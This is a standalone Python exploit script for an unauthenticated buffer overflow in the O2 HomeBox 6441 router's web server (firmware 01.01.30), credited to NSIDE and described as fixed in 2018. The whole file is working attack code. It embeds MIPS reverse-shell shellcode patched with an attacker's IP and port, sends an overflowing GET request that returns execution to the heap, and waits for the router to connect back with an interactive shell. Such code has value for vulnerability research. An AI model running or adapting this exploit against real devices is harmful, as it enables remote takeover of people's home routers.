#!/usr/bin/env python3

import struct, socket, sys, telnetlib
from time import sleep


# NSIDE discovered a buffer overflow in the webserver of the HomeBox 6441 in firmware 01.01.30.
# The vulnerability was reported and resolved in 2018.
# Blogpost: https://www.nsideattacklogic.de/exploitation-of-a-vanilla-buffer-overflow-in-the-o2-homebox-6441-router-unauthenticated-a-step-by-step-abuse-guide-2/
# Article by Heise.de: https://www.heise.de/security/meldung/O2-HomeBox-Router-liessen-sich-kapern-4328497.html



def interactive(sock, production = True):
        if production:
                sock.send(b'uname -a;id;echo "\n"\n')
                sleep(.1)
        t = telnetlib.Telnet()
        t.sock = sock
        t.interact()
	
if(len(sys.argv) < 5) :
        print('[-] Usage : pwn.py remote_ip remote_port local_ip local_port')
        print('[!] ATTENTION: Arguments have to be valid at first attempt, further attempts all trigger the values sent at first attempt')

        sys.exit(-1)

host = sys.argv[1]
port = int(sys.argv[2])
rev_port = int(sys.argv[4])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
s1.settimeout(2)

print('[+] Starting listener on 0.0.0.0:' + str(rev_port) + '\n')
s1.bind(("0.0.0.0", rev_port))
s1.listen(2)

try :
	s.connect((host, port))
except :
	print('[-] Unable to connect')
	sys.exit(-1)

print('[+] Connected to remote host')

# ip to bytes for the shellcode
ip = sys.argv[3].split('.')
a = bytes([int(ip[0])])
b = bytes([int(ip[1])])
c = bytes([int(ip[2])])
d = bytes([int(ip[3])])
rev_port = struct.pack('>H',rev_port)

shellcode = b'\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff\xfd\x21'
shellcode += b'\xe5\xff\xfd\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01'
shellcode += b'\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff\x34\x0f\xff'
shellcode += b'\xfd\x01\xe0\x78\x27\xaf\xaf\xff\xe0\x3c\x0e' + rev_port
shellcode += b'\x35\xce' + rev_port + b'\xaf\xae\xff\xe4\x3c\x0e' + a + b + b'\x35'
shellcode += b'\xce' + c + d + b'\xaf\xae\xff\xe6\x27\xa5\xff\xe2\x24\x0c'
shellcode += b'\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a\x01\x01\x01'
shellcode += b'\x0c\x24\x11\xff\xfd\x02\x20\x88\x27\x8f\xa4\xff\xff'
shellcode += b'\x02\x20\x28\x21\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24'
shellcode += b'\x10\xff\xff\x22\x31\xff\xff\x16\x30\xff\xfa\x28\x06'
shellcode += b'\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff'
shellcode += b'\xec\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf0'
shellcode += b'\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8\xaf'
shellcode += b'\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01'
shellcode += b'\x01\x0c'

print('[+] Pushing shellcode and returning to heap\n')

payload = b'A' * 153 + b'\x44\x83\xcc'  # return to 0x4483cc on the heap

request = b'GET /cgi/?_tn=' + payload + b' HTTP/1.1\r\n'
request += b'Host: 192.168.1.1\r\n'
request += shellcode + b'\r\n\r\n\r\n'
s.send(request)

sleep(.5)
(client, (ip, port)) = s1.accept()
print('[+] Incoming connection from: ' + ip + ':' + str(port) + '\n')

interactive(client)
